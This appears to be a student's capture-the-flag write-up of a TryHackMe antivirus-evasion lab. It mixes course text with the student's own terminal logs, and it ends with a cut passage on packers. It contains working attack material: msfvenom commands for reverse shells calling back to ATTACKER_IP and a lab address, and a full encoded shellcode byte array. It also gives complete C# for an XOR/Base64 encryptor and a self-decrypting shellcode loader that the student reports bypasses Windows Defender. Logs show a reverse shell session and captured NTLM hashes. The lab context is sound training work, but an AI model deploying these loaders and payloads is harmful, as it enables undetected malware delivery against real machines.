With all of this ready, we can now execute our stager payload. The stager should connect to the HTTPS server and retrieve the shellcode.bin file to load it into memory and run it on the victim machine. Remember to set up an nc listener to receive the reverse shell on the same port specified when running msfvenom:

```

AttackBox

user@AttackBox$ nc -lvp 7474


```



Do staged payloads deliver the full content of our payload in a single package? (yea/nay)
*nay*


Is the Metasploit payload windows/x64/meterpreter_reverse_https a staged payload? (yea/nay)
*nay*


Is the stage0 of a staged payload in charge of downloading the final payload to be executed? (yea/nay)
*yea*



Follow the instructions to create a staged payload and upload it into the THM Antivirus Check at http://10.10.195.70/


```
PS C:\Users\thm> cd "C:\Tools\CS Files"
PS C:\Tools\CS Files> csc .\StagedPayload.cs
Microsoft (R) Visual C# Compiler version 4.8.3761.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

┌──(kali㉿kali)-[~]
└─$ mkdir share          
                                                                                           
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username thm -password Password321 public share
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.195.70,49996)
[*] AUTHENTICATE_MESSAGE (AV-EVASION-PC\thm,AV-EVASION-PC)
[*] User AV-EVASION-PC\thm authenticated successfully
[*] thm::AV-EVASION-PC:aaaaaaaaaaaaaaaa:74736b907cbd6f8036fc0fdfbfb09a47:010100000000000000ecda51f2c9d801f5923e5921412b9f000000000100100059006f00640067006b006900640059000300100059006f00640067006b00690064005900020010006500530068004c007800470074004d00040010006500530068004c007800470074004d000700080000ecda51f2c9d80106000400020000000800300030000000000000000000000000200000c4c787e45b18d5bbaf1eeb4e73b04318e169500bed066dd6c64813c1f68ba5a80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:public)
[*] Closing down connection (10.10.195.70,49996)
[*] Remaining connections []

C:\Users\thm>copy "C:\Tools\CS Files\StagedPayload.exe" \\10.11.81.220\public\
        1 file(s) copied.
        
┌──(kali㉿kali)-[~]
└─$ cd share          
                                                                                           
┌──(kali㉿kali)-[~/share]
└─$ ls
StagedPayload.exe


┌──(kali㉿kali)-[~/payloads]
└─$ cd /home/kali/asm      
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ ls
flag.c  shellcode.bin      thm      thm.c  thm.text
flagx   staged-payload.cs  thm.asm  thm.o  thmx
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
...+..............+.......+...+.....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+........+.......+.....+...+.......+.....+.......+.................+...+...+....+...........+.......+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*........+...+......+.+......+.....+....+......+.....+.......+.......................+.......+.....+.......+...+..+....+.....+.+.....+....+............+..+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
.+..+.+......+...+...+........+.......+...+.....+.........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*......+.+.....+.+........+....+..+.+............+......+..+...+......+.+.....+.........+..........+...+......+.....+....+..+...+......+.+..............+.+...........+...+.+...+...+.....+.........+...............+......+............+.+......+.....+...+.............+...+..+..........+..................+.....+......+.+..+...+.......+..+..........+......+...+.....+.+...+..+.+........+................+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ ls
flag.c  localhost.pem  staged-payload.cs  thm.asm  thm.o     thmx
flagx   shellcode.bin  thm                thm.c    thm.text
                                                                                           
┌──(kali㉿kali)-[~/asm]
└─$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()" 
<string>:1: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()


──(kali㉿kali)-[~/share]
└─$ ls
StagedPayload.exe
                                                                                           
┌──(kali㉿kali)-[~/share]
└─$ nc -lvp 7474              
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7474
Ncat: Listening on 0.0.0.0:7474
ls
Ncat: Connection from 10.10.195.70.
Ncat: Connection from 10.10.195.70:50013.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\App>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\App>whoami
whoami
av-evasion-pc\av-victim

C:\App>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\

08/30/2022  11:36 PM    <DIR>          App
11/14/2018  06:56 AM    <DIR>          EFI
09/01/2022  12:24 AM    <DIR>          metasploit-framework
05/13/2020  05:58 PM    <DIR>          PerfLogs
08/31/2022  12:06 PM    <DIR>          Program Files
08/31/2022  12:05 PM    <DIR>          Program Files (x86)
08/30/2022  05:46 PM    <DIR>          Tools
08/30/2022  11:45 PM    <DIR>          Users
08/31/2022  02:03 PM    <DIR>          Windows
               0 File(s)              0 bytes
               9 Dir(s)   3,089,911,808 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

08/30/2022  11:45 PM    <DIR>          .
08/30/2022  11:45 PM    <DIR>          ..
08/31/2022  02:06 PM    <DIR>          Administrator
08/30/2022  11:45 PM    <DIR>          av-victim
12/12/2018  07:45 AM    <DIR>          Public
09/01/2022  12:32 AM    <DIR>          thm
               0 File(s)              0 bytes
               6 Dir(s)   3,089,911,808 bytes free

C:\Users>cd av-victim   
cd av-victim

C:\Users\av-victim>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\av-victim

08/30/2022  11:45 PM    <DIR>          .
08/30/2022  11:45 PM    <DIR>          ..
08/31/2022  07:11 PM    <DIR>          Desktop
08/30/2022  11:45 PM    <DIR>          Documents
09/15/2018  07:19 AM    <DIR>          Downloads
09/15/2018  07:19 AM    <DIR>          Favorites
09/15/2018  07:19 AM    <DIR>          Links
09/15/2018  07:19 AM    <DIR>          Music
09/15/2018  07:19 AM    <DIR>          Pictures
09/15/2018  07:19 AM    <DIR>          Saved Games
09/15/2018  07:19 AM    <DIR>          Videos
               0 File(s)              0 bytes
              11 Dir(s)   3,089,911,808 bytes free

C:\Users\av-victim>cd Desktop
cd Desktop

C:\Users\av-victim\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\av-victim\Desktop

08/31/2022  07:11 PM    <DIR>          .
08/31/2022  07:11 PM    <DIR>          ..
08/31/2022  07:12 PM                28 flag.txt
               1 File(s)             28 bytes
               2 Dir(s)   3,089,911,808 bytes free

C:\Users\av-victim\Desktop>more flag.txt
more flag.txt
THM{H3ll0-W1nD0ws-Def3nd3r!}

```

### Introduction to Encoding and Encryption 

What is Encoding?

Encoding is the process of changing the data from its original state into a specific format depending on the algorithm or type of encoding. It can be applied to many data types such as videos, HTML, URLs, and binary files (EXE, Images, etc.).

Encoding is an important concept that is commonly used for various purposes, including but not limited to:

    Program compiling and execution
    Data storage and transmission
    Data processing such as file conversion

Similarly, when it comes to AV evasion techniques, encoding is also used to hide shellcode strings within a binary. However, encoding is not enough for evasion purposes. Nowadays, AV software is more intelligent and can analyze a binary, and once an encoded string is found, it is decoded to check the text's original form.

You can also use two or more encoding algorithms in tandem to make it harder for the AV to figure out the hidden content. The following figure shows that we converted the "THM" string into hexadecimal representation and then encoded it using Base64. In this case, you need to make sure that your dropper now handles such encoding to restore the string to its original state.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6b3d06034f60f472a3c3620815d25be1.png)

What is Encryption?

Encryption is one of the essential elements of information and data security which focuses on preventing unauthorized access and manipulation of data. The encryption process involves converting plaintext (unencrypted content) into an encrypted version called Ciphertext. The Ciphertext can't be read or decrypted without knowing the algorithm used in encryption as well as the key.

Like encoding, encryption techniques are used for various purposes, such as storing and transmitting data securely, as well as end-to-end encryption. Encryption can be used in two ways: having a shared key between two parties or using public and private keys.

For more information about encryption, we encourage you to check Encryption - Crypto 101 room.

Encryption and Decryption Concepts!

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7cd2d23f048dd314a46910fb29c9836f.png)

Why do we Need to Know About Encoding and Encryption?

AV vendors implement their AV software to blocklist most public tools (such as Metasploit and others) using static or dynamic detection techniques. Therefore, without modifying the shellcode generated by these public tools, the detection rate for your dropper is high.

Encoding and encryption can be used in AV evasion techniques where we encode and/or encrypt shellcode used in a dropper to hide it from AV software during the runtime. Also, the two techniques can be used not only to hide the shellcode but also functions, variables, etc. In this room, we mainly focus on encrypting the shellcode to evade Windows Defender.


Is encoding shellcode only enough to evade Antivirus software? (yea/nay)
*nay*

Do encoding techniques use a key to encode strings or files? (yea/nay)
*nay*

Do encryption algorithms use a key to encrypt strings or files? (yea/nay)
*yea*

###  Shellcode Encoding and Encryption 

Encode using MSFVenom

Public Tools such as Metasploit provide encoding and encryption features. However, AV vendors are aware of the way these tools build their payloads and take measures to detect them. If you try using such features out of the box, chances are your payload will be detected as soon as the file touches the victim's disk.

Let's generate a simple payload with this method to prove that point. First of all, you can list all of the encoders available to msfvenom with the following command:

```

Listing Encoders within the Metasploit Framework

           
user@AttackBox$ msfvenom --list encoders | grep excellent
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder


```

We can indicate we want to use the shikata_ga_nai encoder with the -e(encoder) switch and then specify we want to encode the payload three times with the -i (iterations) switch:

```

Encoding using the Metasploit Framework (Shikata_ga_nai)

           
user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai chosen with final size 422
Payload size: 422 bytes
Final size of csharp file: 2170 bytes


```

If we try uploading our newly generated payload to our test machine, the AV will instantly flag it before we even get a chance to execute it:

Windows Defender detected our payload as malicious!

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/747c69e737c96044123329c47845f659.png)
```
┌──(kali㉿kali)-[~/asm]
└─$ msfvenom -a x86 --platform Windows LHOST=10.11.81.220 LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp 
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai succeeded with size 378 (iteration=1)
x86/shikata_ga_nai succeeded with size 405 (iteration=2)
x86/shikata_ga_nai chosen with final size 405
Payload size: 405 bytes
Final size of csharp file: 2083 bytes
byte[] buf = new byte[405] {
0xba,0xaf,0x72,0xdf,0xab,0xda,0xca,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,
0x5f,0x31,0x53,0x14,0x03,0x53,0x14,0x83,0xc3,0x04,0x4d,0x87,0x04,0x69,0x48,
0x1c,0x9f,0x9a,0xd7,0x39,0x6d,0x71,0x41,0x9a,0xb9,0xbf,0x3c,0x42,0x8f,0x57,
0x24,0x70,0x87,0xbd,0xdb,0x9e,0xab,0x20,0xca,0x35,0x84,0x79,0xde,0xcc,0x46,
0x05,0x03,0xad,0x2f,0x35,0xf8,0x91,0x48,0x4b,0x57,0x56,0x84,0x2a,0x69,0x5f,
0xf9,0x4a,0x18,0x2c,0x9b,0x88,0xd2,0xa8,0xab,0x6f,0x65,0xd0,0x8b,0x01,0xd6,
0xc8,0x03,0x0d,0x1e,0x21,0x61,0x62,0x29,0xb0,0x0d,0x1a,0x39,0x49,0xee,0x43,
0x2f,0xf7,0xec,0x52,0xb2,0x9a,0x10,0xc8,0xdf,0x02,0x6e,0xac,0x18,0x3d,0x5e,
0x68,0x94,0xb9,0x7f,0xf4,0xe3,0x34,0x1f,0x0a,0x67,0x6c,0x6a,0xb2,0x41,0x48,
0xe7,0x4c,0x5a,0xd1,0x79,0x55,0xc7,0x0e,0xa3,0x87,0xbb,0x07,0x52,0x41,0x6e,
0x13,0x7f,0x4d,0xc5,0x47,0xc9,0xad,0xdc,0x5a,0xee,0x53,0xae,0xfb,0x92,0x0b,
0x8a,0x03,0x69,0xd8,0xb4,0x88,0xa6,0x8c,0xdb,0xf5,0x2f,0xc3,0x5d,0xd0,0x1b,
0xab,0x10,0x97,0x2e,0x25,0xe9,0xc6,0x58,0x38,0xd2,0xf9,0xcd,0x1e,0x6c,0x87,
0x0c,0x56,0x9d,0xfa,0xf4,0xa2,0x1b,0x36,0x18,0xfd,0x31,0x33,0xa5,0x14,0x1b,
0xad,0x97,0x82,0x0a,0x84,0x0f,0xf0,0xb3,0x4a,0x22,0x63,0x80,0xc8,0xbb,0x78,
0xe2,0x7c,0x39,0x7f,0xbf,0x4c,0x17,0x2a,0x7e,0x79,0x80,0x50,0x57,0x97,0xe4,
0x73,0x8f,0x64,0x36,0xa3,0xee,0x7b,0xc1,0xea,0x4a,0xe1,0x20,0x8a,0x89,0xdb,
0x98,0x85,0x31,0xbf,0x43,0xe5,0x76,0x8c,0x06,0x2a,0x89,0xe4,0xf7,0xba,0xb1,
0xe0,0xb0,0x05,0x17,0xf6,0xa2,0x36,0xd7,0xc8,0xde,0xb9,0xcb,0xa1,0x2a,0xdc,
0x04,0x6a,0xed,0x27,0x4a,0x7c,0x1d,0x83,0xe6,0x34,0x2f,0x16,0xb5,0x0a,0x35,
0x48,0xbd,0x2a,0x36,0x07,0x62,0x51,0x3d,0x67,0x72,0x65,0x5f,0x4c,0x5b,0xf7,
0x79,0xcb,0x1c,0x0f,0x26,0xbf,0xb7,0xd0,0x6a,0x88,0x0e,0xeb,0xe5,0x2e,0x69,
0x4f,0x77,0x07,0x79,0xd0,0xc4,0x67,0xc2,0xbf,0xde,0xd9,0x62,0x9c,0x66,0x16,
0x79,0xea,0x79,0xea,0x4b,0x7f,0x1c,0xee,0x5a,0xe1,0x8b,0x71,0x32,0xbd,0xc5,
0xce,0xbd,0xd5,0x6f,0xf2,0xce,0x1c,0xe9,0x4a,0xbe,0x36,0x1d,0x7f,0x96,0x84,
0x7d,0x8c,0xee,0x23,0x1b,0xa4,0x77,0x6d,0xf0,0xb0,0xd2,0x3e,0x90,0x6d,0x5d,
0x3f,0x43,0x29,0x99,0x33,0xa9,0xe9,0x89,0x77,0x40,0xcd,0x1d,0x44,0xea,0x2a };
```

If encoding doesn't work, we can always try encrypting the payload. Intuitively, we would expect this to have a higher success rating, as decrypting the payload should prove a harder task for the AV. Let's try that now.

Encryption using MSFVenom

You can easily generate encrypted payloads using msfvenom. The choices for encryption algorithms are, however, a bit scarce. To list the available encryption algorithms, you can use the following command:

```

Listing encryption modules within the Metasploit Framework

           
user@AttackBox$ msfvenom --list encrypt
Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor

        


```


        

Let's build an XOR encrypted payload. For this type of algorithm, you will need to specify a key. The command would look as follows:

```
           
user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: xored-revshell.exe

        
```

Once again, if we upload the resulting shell to the THM Antivirus Check! page at http://10.10.195.70/, it will still be flagged by the AV. The reason is still that AV vendors have invested lots of time into ensuring simple msfvenom payloads are detected.

Creating a Custom Payload

The best way to overcome this is to use our own custom encoding schemes so that the AV doesn't know what to do to analyze our payload. Notice you don't have to do anything too complex, as long as it is confusing enough for the AV to analyze. For this task, we will take a simple reverse shell generated by msfvenom and use a combination of XOR and Base64 to bypass Defender.

Let's start by generating a reverse shell with msfvenom in CSharp format:

```

Generate a CSharp shellcode Format

           
user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp

        


```

The Encoder

	Before building our actual payload, we will create a program that will take the shellcode generated by msfvenom and encode it in any way we like. In this case, we will be XORing the payload with a custom key first and then encoding it using base64. Here's the complete code for the encoder (you can also find this code in your Windows machine at C:\Tools\CS Files\Encryptor.cs):

```

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "THMK3y123!";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}
```

The code is pretty straightforward and will generate an encoded payload that we will embed on the final payload. Remember to replace the *buf variable with the shellcode you generated with msfvenom*.

To compile and execute the encoder, we can use the following commands on the Windows machine:

```

Compiling and running our custom CSharp encoder

           
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=

        


```

Self-decoding Payload

	Since we have an encoded payload, we need to adjust our code so that it decodes the shellcode before executing it. To match the encoder, we will decode everything in the reverse order we encoded it, so we start by decoding the base64 content and then continue by XORing the result with the same key we used in the encoder. Here's the full payload code (you can also get it in your Windows machine at C:\Tools\CS Files\EncStageless.cs):

```

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

Note that we have merely combined a couple of really simple techniques that were detected when used separately. Still, the AV won't complain about the payload this time, as the combination of both methods is not something it can analyze directly.

Let's compile our payload with the following command on the Windows machine:

```

Compile Our Encrypted Payload

           
C:\> csc.exe EncStageless.cs

        


```

Before running our payload, let's set up an nc listener. After copying and executing our payload into the victim machine, we should get a connection back as expected:

```

Set Up nc Listener

           
user@AttackBox$ nc -lvp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>

        


```

As you can see, simple adjustments are enough sometimes. Most of the time, any specific methods you find online won't probably work out of the box as detection signatures may already exist for them. However, using a bit of imagination to customize any method could prove enough for a successful bypass.


Try to use this technique (combining encoding and encryption) on the THM Antivirus Check at http://10.10.195.70/. Does it bypass the installed AV software?

```
after copy csharp generated for msfvenom then copy the hexadecimal into encryptor.cs, execute the encryptor.exe

PS C:\Users\thm> cd "C:\Tools\CS Files"                                                                                 PS C:\Tools\CS Files> csc.exe .\Encryptor.cs                                                                            Microsoft (R) Visual C# Compiler version 4.8.3761.0                                                                     for C# 5                                                                                                                Copyright (C) Microsoft Corporation. All rights reserved.                                                                                                                                                                                       This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240                                                                                                                                                                                                       PS C:\Tools\CS Files> .\Encryptor.exe                                                                                   qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSEzwOXJg7nJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==


```

![[Pasted image 20220916133940.png]]

![[Pasted image 20220916134049.png]]

```
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username thm -password Password321 public share
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.195.70,50207)
[*] AUTHENTICATE_MESSAGE (AV-EVASION-PC\thm,AV-EVASION-PC)
[*] User AV-EVASION-PC\thm authenticated successfully
[*] thm::AV-EVASION-PC:aaaaaaaaaaaaaaaa:98a2e1b9cf863ed62fb7b5309fe37968:01010000000000000072514bfcc9d80145140b052f6c743f000000000100100055005a004a00640069004400510074000300100055005a004a0064006900440051007400020010006c0047007700410046004b0068006200040010006c0047007700410046004b0068006200070008000072514bfcc9d80106000400020000000800300030000000000000000000000000200000c4c787e45b18d5bbaf1eeb4e73b04318e169500bed066dd6c64813c1f68ba5a80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:public)
[*] Closing down connection (10.10.195.70,50207)
[*] Remaining connections []
[*] Incoming connection (10.10.195.70,50210)
[*] AUTHENTICATE_MESSAGE (AV-EVASION-PC\thm,AV-EVASION-PC)
[*] User AV-EVASION-PC\thm authenticated successfully
[*] thm::AV-EVASION-PC:aaaaaaaaaaaaaaaa:ec0ed0ef028296de7f6922dc701ea740:010100000000000000f62863fcc9d8014cf011f3d4da3198000000000100100055005a004a00640069004400510074000300100055005a004a0064006900440051007400020010006c0047007700410046004b0068006200040010006c0047007700410046004b00680062000700080000f62863fcc9d80106000400020000000800300030000000000000000000000000200000c4c787e45b18d5bbaf1eeb4e73b04318e169500bed066dd6c64813c1f68ba5a80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:public)
[*] Disconnecting Share(1:public)
[*] Closing down connection (10.10.195.70,50210)
[*] Remaining connections []

C:\Users\thm>copy "C:\Tools\CS Files\Encryptor.exe" \\10.11.81.220\public\
        1 file(s) copied.

C:\Users\thm>copy "C:\Tools\CS Files\EncStageless.exe" \\10.11.81.220\public\
        1 file(s) copied.


```

![[Pasted image 20220916134659.png]]

*It works! just upload EncStageLess.exe and use a reverse shell listening on port 443*

### Packers 

Another method to defeat disk-based AV detection is to use a packer. Packers are pieces of software that take a program as input and transform it so that its structure looks different, but their functionality remains exactly the same. Packers do this with two main goals in mind:

    Compress the program so that it takes up less space.
    Protect the program from reverse engineering in general.

Packers are commonly used by software developers who would like to protect their software from being reverse engineered or cracked. They achieve some level of protection by implementing a mixture of transforms that include compressing, encrypting, adding debugging protections and many others. As you may have already guessed, packers are also commonly used to obfuscate malware without much effort.

There's quite a large number of packers out there, including UPX, MPRESS, Themida, and many others.

Packing an application

While every packer operates differently, let's look at a basic example of what a simple packer would do.

When an application is packed, it will be transformed in some way using a packing function. The packing function needs to be able to obfuscate and transform the original code of the application in a way that can be reasonably reversed by an unpacking function so that the original functionality of the application is preserved. While sometimes the packer may add some code (to make debugging the application harder, for example), it will generally want to be able to get back the original code you wrote when executing it.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9aacb2fab2a656ffc82a7b0344918062.png)

The packed version of the application will contain your packed application code. Since this new packed code is obfuscated, the application needs to be able to unpack the original code from it. To this end, the packer will embed a code stub that contains an unpacker and redirect the main entry point of the executable to it.

When your packed application gets executed, the following will happen:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/408fb909374c2b54bebef9809eaa417a.png)


    The unpacker gets executed first, as it is the executable's entry point.
    The unpacker reads the packed application's code.
    The unpacker will write the original unpacked code somewhere in memory and direct the execution flow of the application to it.

Packers and AVs

By now, we can see how packers help bypass AV solutions. Let's say you built a reverse shell executable, but the AV is catching it as malicious because it matches a known signature. In this case, using a packer will transform the reverse shell executable so that it doesn't match any known signatures while on disk. As a result, you should be able to distribute your payload to any machine's disk without much problem.

AV solutions, however, could still catch your packed application for a couple of reasons:

    While your original code might be transformed into something unrecognizable, remember that the packed executable contains a stub with the unpacker's code. If the unpacker has a known signature, AV solutions might still flag any packed executable based on the unpacker stub alone.
    At some point, your application will unpack the original code into memory so that it can be executed. If the AV solution you are trying to bypass can do in-memory scans, you might still be detected after your code is unpacked.

Packing our shellcode

	Let's start from a basic C# shellcode. You can also find this code in your Windows machine at C:\Tools\CS Files\UnEncStagelessPayload.cs:

```
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };


